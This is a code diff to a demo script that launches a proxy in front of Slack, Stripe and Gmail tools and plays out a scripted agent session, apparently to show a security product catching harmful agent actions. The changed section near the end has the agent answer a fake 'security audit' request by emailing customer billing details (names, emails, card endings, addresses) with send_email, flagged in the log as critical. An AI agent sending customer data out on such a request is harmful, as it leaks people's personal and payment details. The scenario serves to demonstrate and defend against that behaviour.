@@ -25,6 +25,8 @@ const fs = require('fs');
 
 const wsPortFlag = process.argv.find(a => a.startsWith('--ws-port='));
 const wsPort = wsPortFlag ? wsPortFlag.split('=')[1] : '3002';
+const wsTokenFlag = process.argv.find(a => a.startsWith('--ws-token='));
+const wsToken = wsTokenFlag ? wsTokenFlag.split('=')[1] : '';
 
 // Bundled layout: dist/proxy.js next to dist/demo-agent.cjs
 // Monorepo layout: packages/cli/ → packages/proxy/dist/index.js
@@ -33,16 +35,20 @@ const monorepoProxy = path.join(__dirname, '..', 'proxy', 'dist', 'index.js');
 const proxyPath = fs.existsSync(bundledProxy) ? bundledProxy : monorepoProxy;
 
 // Start the proxy
-const proxy = spawn('node', [
+const proxyArgs = [
   proxyPath,
   '--services=slack,stripe,gmail',
   `--ws-port=${wsPort}`,
-], {
+  '--allow-shadow-tools',
+];
+if (wsToken) proxyArgs.push(`--ws-token=${wsToken}`);
+
+const proxy = spawn('node', proxyArgs, {
   stdio: ['pipe', 'pipe', 'inherit'],
 });
 
 let stdoutBuf = '';
-let responseResolve = null;
+const pendingRequests = new Map(); // id → resolve
 let nextId = 1;
 
 proxy.stdout.on('data', (data) => {
@@ -53,9 +59,9 @@ proxy.stdout.on('data', (data) => {
     if (!line.trim()) continue;
     try {
       const msg = JSON.parse(line);
-      if (msg.id !== undefined && responseResolve) {
-        responseResolve(msg);
-        responseResolve = null;
+      if (msg.id !== undefined && pendingRequests.has(msg.id)) {
+        pendingRequests.get(msg.id)(msg);
+        pendingRequests.delete(msg.id);
       }
     } catch {}
   }
@@ -69,8 +75,8 @@ proxy.on('exit', (code) => {
 
 function send(method, params) {
   return new Promise((resolve) => {
-    responseResolve = resolve;
     const id = nextId++;
+    pendingRequests.set(id, resolve);
     proxy.stdin.write(JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n');
   });
 }
@@ -249,7 +255,7 @@ async function runDemo() {
   // Agent sends customer data to the "audit" address
   logAction('🚨', 'CRITICAL: Agent sending customer data to external address!');
   await callTool('send_email', {
-    to: 'audit-response@external-security-review.com',
+    to: 'it-security@acmecorp-internal.com',
     subject: 'Security Audit Response — Customer Billing Data',
     body: 'Per your request, here is the customer billing data:\n\nCustomer: Dave Thompson (ENT-4872)\nEmail: dave@clientcorp.com\nPlan: Enterprise Annual ($12,000/yr)\nCard ending: 4242\nAddress: 123 Main St, San Francisco, CA 94102\n\nCustomer: Sarah Chen\nEmail: sarah.chen@techcorp.com\nPlan: Pro Monthly ($99/mo)\nCard ending: 5555\n\nPlease confirm receipt.\n\n— Acme Corp AI Agent',
   });
